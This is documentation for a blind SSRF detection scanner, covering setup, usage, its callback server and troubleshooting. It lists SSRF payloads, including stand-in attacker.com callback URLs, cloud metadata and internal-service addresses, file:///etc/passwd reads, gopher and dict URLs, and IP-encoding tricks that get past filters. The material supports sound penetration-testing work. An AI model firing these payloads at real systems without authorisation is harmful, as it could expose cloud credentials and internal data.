# SSRF Module - Complete Guide

**Blind Server-Side Request Forgery (SSRF) Detection Framework**

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [How It Works](#how-it-works)
3. [Architecture](#architecture)
4. [Usage Examples](#usage-examples)
5. [Payload Types](#payload-types)
6. [Testing Guide](#testing-guide)
7. [Callback Server API](#callback-server-api)
8. [Troubleshooting](#troubleshooting)

---

## Quick Start

### 3-Step Setup

**Step 1: Expose Callback Server (Choose One)**

```bash
# Option 1: Using ngrok (easiest)
ngrok http 5000
# Copy forwarding URL: https://abc123.ngrok.io

# Option 2: Your own server
# Ensure your-server.com:5000 is publicly accessible

# Option 3: Cloud environment
# Already exposed if running on cloud instance
```

**Step 2: Run SSRF Scan**

```bash
# Basic scan
python main.py --scan ssrf \
  -f targets.txt \
  --listener https://abc123.ngrok.io \
  --wait 30

# With recon
python main.py -u target.com --recon \
  --scan ssrf \
  --listener https://abc123.ngrok.io \
  --wait 30
```

**Step 3: Check Results**

```bash
# View findings
cat bssrf/output/findings_ssrf.json

# Check callbacks
curl http://localhost:5000/api/callbacks
```

---

## How It Works

### Blind SSRF Detection Flow

```
1. INJECT PAYLOAD
   ↓
   Target Server receives:
   http://victim.com/api?url=http://attacker.com/callback/{UUID}
   
2. BACKEND MAKES REQUEST
   ↓
   Victim's server requests:
   GET http://attacker.com/callback/{UUID}
   
3. CALLBACK RECEIVED
   ↓
   Our server logs:
   - UUID
   - Source IP
   - Timestamp
   - Headers
   
4. CORRELATION
   ↓
   Match UUID → Confirm SSRF
```

### Key Concept: Out-of-Band (OOB) Detection

Unlike reflected SSRF (visible in response), **blind SSRF** provides no direct feedback. Detection relies on:

- **UUID Correlation:** Each payload has unique identifier
- **Callback Timing:** Match injection time with callback time
- **Multiple Protocols:** HTTP, DNS, FTP callbacks
- **Automatic Verification:** System confirms vulnerabilities

---

## Architecture

### Component Overview

```
bssrf/
├── modules/blind_ssrf/
│   ├── ssrf_module.py        # Main orchestrator
│   ├── detector.py           # Injection logic
│   ├── payloads.py           # 51+ payload types
│   └── __init__.py
│
├── oob/
│   ├── callback_server.py    # Flask HTTP listener
│   └── correlation.py        # UUID matching
│
└── output/
    ├── findings_ssrf.json    # Results (JSON)
    ├── findings_ssrf.txt     # Results (readable)
    ├── callbacks.db          # SQLite persistence
    └── injections.db         # Injection tracking
```

### Key Components

#### 1. SSRF Module (`ssrf_module.py`)
- Coordinates scanning across URLs
- Manages payload injection
- Correlates callbacks
- Generates findings

#### 2. Detector (`detector.py`)
- Injects payloads into parameters
- Tracks injection metadata
- Calculates confidence scores

#### 3. Payload Engine (`payloads.py`)
- 51+ payload variations
- Multiple protocols (HTTP, FTP, Gopher, DICT, file)
- Encoding/obfuscation techniques
- Cloud metadata endpoints

#### 4. Callback Server (`callback_server.py`)
- **Auto-starts** in background when scanning
- Flask HTTP server on port 5000
- SQLite persistence
- Replay protection
- API endpoints for querying

#### 5. Correlation Engine (`correlation.py`)
- Injection tracking with UUIDs
- Callback matching
- Timing validation
- Expiration handling

---

## Usage Examples

### Example 1: Basic SSRF Scan (No Recon)

```bash
# Create targets file
echo 'http://example.com/fetch?url=test' > targets.txt
echo 'http://example.com/webhook?callback=test' >> targets.txt

# Start ngrok
ngrok http 5000  # Copy URL: https://abc123.ngrok.io

# Run scan
python main.py --scan ssrf \
  -f targets.txt \
  --listener https://abc123.ngrok.io \
  --wait 30 \
  --threads 5
```

**Output:**
```
[INFO] Starting OOB callback server...
[SUCCESS] Callback server started
[INFO] Initializing SSRF detector...
[SSRF] http://example.com/fetch?url=test: 2 injection points
[INFO] Waiting 30s for OOB callbacks...
[SUCCESS] Scan Results: 2 injection points tested
[SUCCESS] Confirmed Vulnerabilities: 1
```

### Example 2: With Passive Recon

```bash
python main.py -u example.com --recon --recon-mode passive \
  --scan ssrf \
  --listener https://abc123.ngrok.io \
  --wait 30
```

**What Happens:**
1. GAU discovers URLs from domain
2. GF filters for SSRF-prone parameters
3. Scanner injects payloads
4. Callbacks confirm vulnerabilities

### Example 3: Direct URL Scan

```bash
python main.py -u 'http://example.com/api/fetch?url=test' \
  --scan ssrf \
  --listener https://abc123.ngrok.io \
  --wait 30
```

### Example 4: Testing on Demo Vulnerable App

```bash
# Terminal 1: Start demo app
cd demo_vuln_app
python app.py --port 8000

# Terminal 2: Run scan (in new terminal)
python main.py --scan ssrf \
  -f demo_vuln_app/urls_ssrf.txt \
  --listener http://127.0.0.1:5000 \
  --wait 30

# View results
cat bssrf/output/findings_ssrf.json
```

---

## Payload Types

### 1. HTTP Callbacks (Primary)

```python
# Standard HTTP
http://attacker.com/callback/{uuid}
http://attacker.com/?id={uuid}

# With path injection
http://attacker.com/ssrf/{uuid}/test

# URL-encoded
http%3A%2F%2Fattacker.com%2F{uuid}
```

### 2. Cloud Metadata Endpoints

```python
# AWS EC2 metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/instance/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### 3. Internal Services

```python
# Common internal services
http://localhost:80
http://127.0.0.1:8080
http://0.0.0.0:3306
http://[::1]:6379

# Internal domains
http://internal.company.com
http://admin.local
http://db.internal
```

### 4. Protocol Variations

```python
# FTP
ftp://attacker.com/{uuid}

# Gopher (useful for exploiting services)
gopher://attacker.com/_GET%20/{uuid}

# DICT
dict://attacker.com:11111/{uuid}

# File (local file access)
file:///etc/passwd
file:///c:/windows/win.ini
```

### 5. Bypass Techniques

```python
# IP obfuscation
http://2130706433/          # Decimal (127.0.0.1)
http://0x7f000001/          # Hexadecimal
http://017700000001/        # Octal
http://127.1/               # Short form

# DNS rebinding
http://spoofed.burpcollaborator.net

# URL encoding
http%3A%2F%2F127.0.0.1%2Fadmin

# Case variation
HtTp://AtTaCkEr.CoM/{uuid}

# Unicode bypass
http://attacker。com/{uuid}
```

---

## Testing Guide

### Setup Demo Environment

**Step 1: Create Test URLs File**

```bash
cat > demo_vuln_app/urls_ssrf.txt << 'EOF'
http://127.0.0.1:8000/fetch_image?url=PAYLOAD
http://127.0.0.1:8000/webhook?callback=PAYLOAD
http://127.0.0.1:8000/fetch_file?file=PAYLOAD
EOF
```

**Step 2: Start Demo Vulnerable App**

```bash
cd demo_vuln_app
python app.py --port 8000 &
cd ..
sleep 3

# Verify it's running
curl "http://127.0.0.1:8000/fetch_image?url=http://example.com/test.jpg"
# Should return: {"status":"success",...}
```

**Step 3: Run SSRF Scan**

```bash
python main.py --scan ssrf \
  -f demo_vuln_app/urls_ssrf.txt \
  --listener http://127.0.0.1:5000 \
  --wait 30 \
  --threads 2
```

**Step 4: Check Results**

```bash
# View findings
cat bssrf/output/findings_ssrf.json | jq .

# View raw callbacks
curl http://127.0.0.1:5000/api/callbacks

# Check specific UUID
curl http://127.0.0.1:5000/api/check/{UUID}
```

### Automated Test Script

Create `test_ssrf.sh`:

```bash
#!/bin/bash
set -e

echo "[*] Starting demo vulnerable app..."
cd demo_vuln_app
python app.py --port 8000 &
APP_PID=$!
cd ..
sleep 3

echo "[*] Verifying app is running..."
curl -s "http://127.0.0.1:8000/fetch_image?url=http://example.com/test.jpg" > /dev/null
echo "[✓] App running"

echo "[*] Running SSRF scan..."
python main.py --scan ssrf \
  -f demo_vuln_app/urls_ssrf.txt \
  --listener http://127.0.0.1:5000 \
  --wait 30 \
  --threads 2

echo "[*] Checking results..."
if [ -f "bssrf/output/findings_ssrf.json" ]; then
  FINDINGS=$(jq 'length' bssrf/output/findings_ssrf.json)
  echo "[✓] Found $FINDINGS injection points"
else
  echo "[✗] No findings file generated"
fi

echo "[*] Cleaning up..."
kill $APP_PID
echo "[✓] Test complete"
```

Run it:
```bash
chmod +x test_ssrf.sh
./test_ssrf.sh
```

---

## Callback Server API

The callback server automatically starts when you run a scan and provides these API endpoints:

### Endpoints

**1. Health Check**
```bash
GET http://localhost:5000/

Response:
{
  "status": "running",
  "uptime": "00:05:23",
  "callbacks_received": 42
}
```

**2. List All Callbacks**
```bash
GET http://localhost:5000/api/callbacks

Response:
[
  {
    "uuid": "abc123-def456",
    "timestamp": "2026-01-20T10:30:45",
    "source_ip": "203.0.113.42",
    "path": "/callback/abc123-def456",
    "headers": {...}
  },
  ...
]
```

**3. Check Specific UUID**
```bash
GET http://localhost:5000/api/check/{uuid}

Response (found):
{
  "found": true,
  "uuid": "abc123-def456",
  "timestamp": "2026-01-20T10:30:45",
  "source_ip": "203.0.113.42"
}

Response (not found):
{
  "found": false,
  "uuid": "xyz789"
}
```

**4. Receive Callback (Automatic)**
```bash
GET http://your-server.com/callback/{uuid}
GET http://your-server.com/{uuid}
GET http://your-server.com/?id={uuid}

# All formats logged automatically
```

### Database Schema

**callbacks.db:**
```sql
CREATE TABLE callbacks (
  id INTEGER PRIMARY KEY,
  uuid TEXT NOT NULL,
  timestamp TEXT NOT NULL,
  source_ip TEXT,
  path TEXT,
  headers TEXT,
  user_agent TEXT
);
```

**injections.db:**
```sql
CREATE TABLE injections (
  id INTEGER PRIMARY KEY,
  uuid TEXT UNIQUE NOT NULL,
  url TEXT NOT NULL,
  parameter TEXT NOT NULL,
  payload TEXT NOT NULL,
  timestamp TEXT NOT NULL,
  expires_at TEXT NOT NULL
);
```

---

## Troubleshooting

### Common Issues

**Issue: "No callbacks received"**

**Causes:**
- Callback server not publicly accessible
- Firewall blocking port 5000
- Target application has egress filtering
- UUID mismatch

**Solutions:**
```bash
# Verify ngrok is running
curl https://YOUR_NGROK_URL.ngrok.io

# Check callback server
curl http://localhost:5000/

# Test callback manually
curl "http://localhost:5000/callback/test-uuid"
curl http://localhost:5000/api/check/test-uuid
# Should show: {"found": true, ...}

# Increase wait time
python main.py ... --wait 60  # Wait longer for callbacks
```

**Issue: "Callback server won't start"**

**Causes:**
- Port 5000 already in use
- Permission issues

**Solutions:**
```bash
# Check what's using port 5000
lsof -i :5000  # Linux/Mac
netstat -ano | findstr :5000  # Windows

# Kill process using port 5000
kill -9 <PID>

# Or change port in callback_server.py
# Edit: app.run(host='0.0.0.0', port=5001)
```

**Issue: "All findings marked as POTENTIAL (not CONFIRMED)"**

**Cause:**
- Target made requests but callbacks didn't reach server
- WAF/proxy blocking outbound requests
- DNS resolution issues

**Solutions:**
```bash
# Check if ANY callbacks received
curl http://localhost:5000/api/callbacks

# Test with direct IP (bypass DNS)
python main.py ... --listener http://YOUR_IP:5000

# Use cloud metadata (no callback needed for some)
# AWS metadata endpoints return success codes
```

**Issue: "Scan is very slow"**

**Solutions:**
```bash
# Reduce wait time
--wait 10  # Instead of 30

# Increase threads (careful!)
--threads 10

# Scan specific URLs only
python main.py -u 'http://target.com/api?url=test' ...
```

---

## Integration with Main Scanner

### Command Line Options

```bash
python main.py --scan ssrf [OPTIONS]

Required:
  --listener URL        Callback server URL (ngrok or your server)

Optional:
  -u URL                Single target URL
  -f FILE               File with target URLs
  --recon               Enable reconnaissance
  --recon-mode MODE     Recon strategy (passive/active)
  --wait SECONDS        Wait time for callbacks (default: 30)
  --threads N           Concurrent threads (default: 5)
```

### Programmatic Usage

```python
from bssrf.modules.blind_ssrf.ssrf_module import BlindSSRFModule

# Initialize module
module = BlindSSRFModule(
    listener_url='https://abc123.ngrok.io',
    timeout=10,
    wait_time=5
)

# Scan single URL
findings = module.scan_url('http://target.com/api?url=test')

# Check for confirmed vulnerabilities
for finding in findings:
    if finding.get('confirmed'):
        print(f"CONFIRMED: {finding['url']}")
        print(f"Parameter: {finding['parameter']}")
        print(f"UUID: {finding['uuid']}")
```

---

## File Locations

```
Project Root/
├── main.py                           # Entry point
│
├── bssrf/                            # SSRF module
│   ├── __init__.py
│   │
│   ├── modules/blind_ssrf/
│   │   ├── __init__.py
│   │   ├── ssrf_module.py            # Main orchestrator
│   │   ├── detector.py               # Injection logic
│   │   └── payloads.py               # 51+ payload types
│   │
│   ├── oob/
│   │   ├── __init__.py
│   │   ├── callback_server.py        # Flask listener
│   │   └── correlation.py            # UUID matching
│   │
│   └── output/
│       ├── findings_ssrf.json        # Results (JSON)
│       ├── findings_ssrf.txt         # Results (readable)
│       ├── callbacks.db              # SQLite: callbacks
│       └── injections.db             # SQLite: injections
│
├── demo_vuln_app/
│   ├── app.py                        # Test app
│   └── urls_ssrf.txt                 # Test targets
│
└── SSRF_GUIDE.md                     # This file
```

---

## Key Features

✅ **51+ Payload Types**
- HTTP, FTP, Gopher, DICT, file protocols
- Cloud metadata endpoints (AWS, GCP, Azure)
- Bypass techniques (encoding, obfuscation)

✅ **Automatic Callback Server**
- Starts in background when scanning
- SQLite persistence
- Replay protection
- API for querying

✅ **UUID Correlation**
- Each payload gets unique identifier
- Automatic injection tracking
- Timing validation
- Expiration handling

✅ **Production-Ready**
- Clean code architecture
- Comprehensive logging
- Error handling
- JSON + readable output

✅ **Integration**
- Works with main.py scanner
- Optional recon support
- Multi-threaded scanning
- File batch processing

---

## Next Steps

1. **Quick Test:**
   ```bash
   ngrok http 5000
   python main.py --scan ssrf -u 'http://target.com/api?url=test' --listener NGROK_URL
   ```

2. **Full Scan:**
   ```bash
   python main.py -u target.com --recon --scan ssrf --listener NGROK_URL
   ```

3. **Check Results:**
   ```bash
   cat bssrf/output/findings_ssrf.json
   ```

4. **API Queries:**
   ```bash
   curl http://localhost:5000/api/callbacks
   ```

---

**Status:** ✅ Production-Ready  
**Last Updated:** January 20, 2026  
**See Also:** [PROJECT_GUIDE.md](PROJECT_GUIDE.md), [QUICK_REFERENCE.md](QUICK_REFERENCE.md)
